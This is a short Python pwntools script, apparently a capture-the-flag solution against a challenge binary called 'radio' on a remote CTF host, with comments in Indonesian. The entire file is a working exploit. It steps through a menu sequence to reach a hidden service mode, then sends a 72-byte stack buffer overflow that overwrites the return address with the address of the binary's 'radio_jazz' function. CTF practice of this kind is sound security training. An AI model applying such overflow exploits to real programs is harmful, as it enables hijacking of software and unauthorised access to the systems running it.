#!/usr/bin/env python3
from pwn import *

HOST = 'chall.k1nd4sus.it'
PORT = 30507

context.binary = elf = ELF('./radio', checksec=False)
context.arch = 'amd64'


def enter_service_mode(io):
    # Sequence hasil analisis LFSR agar choice_menu lompat ke state SERVICE.
    # Menu mapping: 1->Scan, 2->Tune, 3->Exit
    io.sendlineafter(b'?', b'1')                # Scan
    io.sendlineafter(b'?', b'2')                # Tune
    io.sendlineafter(b'tune to:\n', b'666')    # Set station ke Radio 666 News
    io.sendlineafter(b'?', b'1')                # Scan
    io.sendlineafter(b'?', b'1')                # Scan -> trigger SERVICE mode


def build_payload():
    offset = 72
    return b'A' * offset + p64(elf.symbols['radio_jazz'])


def exploit(io):
    enter_service_mode(io)
    io.recvuntil(b'add to favourites:\n')
    io.sendline(build_payload())
    return io.recvrepeat(2)


if __name__ == '__main__':
    if args.LOCAL:
        io = process('./radio')
    else:
        io = remote(HOST, PORT)

    out = exploit(io)
    print(out.decode('latin-1', errors='ignore'))
    io.close()
